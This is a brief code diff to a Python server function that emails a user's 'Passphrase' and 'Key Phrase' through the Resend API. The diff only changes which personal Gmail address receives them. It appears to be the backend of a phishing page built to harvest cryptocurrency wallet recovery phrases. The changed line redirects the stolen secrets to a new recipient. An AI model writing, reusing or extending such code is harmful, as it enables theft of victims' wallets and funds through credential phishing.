@@ -24,7 +24,7 @@ def server():
 
         response = resend.Emails.send({
         "from": "onboarding@resend.dev",
-        "to": "ichekingsley@gmail.com",
+        "to": "chibuchidavid159@gmail.com",
         "subject": "New Response",
         "text": f"Passphrase: {pass_phrase}\nKey Phrase: {key_phrase}\n Ignore this message if you have not requested the above."
         })
